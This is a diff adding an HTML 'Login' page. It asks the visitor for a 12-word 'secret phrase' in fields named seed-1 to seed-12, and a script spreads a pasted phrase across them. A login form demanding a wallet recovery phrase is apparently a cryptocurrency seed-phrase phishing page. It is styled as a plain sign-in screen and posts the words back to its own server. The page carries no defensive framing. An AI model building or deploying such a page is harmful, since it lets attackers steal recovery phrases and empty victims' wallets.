@@ -1,0 +1,126 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background-color: #0d1117;
+            color: white;
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .card {
+            background-color: #1f2328;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
+            max-width: 380px;
+            width: 100%;
+            text-align: center;
+        }
+
+        .card-title {
+            font-size: 24px;
+            margin-bottom: 15px;
+            color: #58a6ff;
+        }
+
+        .card-text {
+            font-size: 16px;
+            margin-bottom: 20px;
+        }
+
+        .inputs-container {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 10px;
+            margin-bottom: 20px;
+        }
+
+        .input-field {
+            background-color: #272d35;
+            border: 1px solid #444;
+            color: white;
+            padding: 10px;
+            border-radius: 5px;
+            font-size: 14px;
+            width: 100%;
+        }
+
+        .input-field:focus {
+            border-color: #58a6ff;
+            outline: none;
+        }
+
+        .card-button {
+            background-color: #58a6ff;
+            border: none;
+            color: white;
+            padding: 10px 20px;
+            font-size: 16px;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+            width: 100%;
+        }
+
+        .card-button:hover {
+            background-color: #4098ea;
+        }
+    </style>
+</head>
+
+<body style="background-color: #0d1117;">
+    <div class="card">
+        <form method="post">
+            <h2 class="card-title">Login</h2>
+            <p class="card-text">Enter the secret phrase</p>
+            <div class="inputs-container">
+                <input type="text" placeholder="Word 1" class="input-field" name="seed-1" oninput="distributeSeed()">
+                <input type="text" placeholder="Word 2" class="input-field" name="seed-2">
+                <input type="text" placeholder="Word 3" class="input-field" name="seed-3">
+                <input type="text" placeholder="Word 4" class="input-field" name="seed-4">
+                <input type="text" placeholder="Word 5" class="input-field" name="seed-5">
+                <input type="text" placeholder="Word 6" class="input-field" name="seed-6">
+                <input type="text" placeholder="Word 7" class="input-field" name="seed-7">
+                <input type="text" placeholder="Word 8" class="input-field" name="seed-8">
+                <input type="text" placeholder="Word 9" class="input-field" name="seed-9">
+                <input type="text" placeholder="Word 10" class="input-field" name="seed-10">
+                <input type="text" placeholder="Word 11" class="input-field" name="seed-11">
+                <input type="text" placeholder="Word 12" class="input-field" name="seed-12">
+            </div>
+            <button type="submit" class="card-button">Next</button>
+        </form>
+    </div>
+
+    <script>
+        function distributeSeed() {
+            const firstInput = document.querySelector('[name="seed-1"]');  // Первое поле
+            const seedPhrase = firstInput.value.trim();  // Получаем фразу из первого поля
+            const words = seedPhrase.split(/\s+/);  // Разделяем фразу на слова по пробелам
+    
+            // Заполняем все поля, начиная с первого
+            for (let i = 0; i < 12; i++) {
+                const input = document.querySelector(`[name="seed-${i + 1}"]`);
+                if (input) {
+                    input.value = words[i] || '';  // Заполняем поле соответствующим словом или оставляем пустым
+                }
+            }
+        }
+    </script>
+</body>
+
+</html>
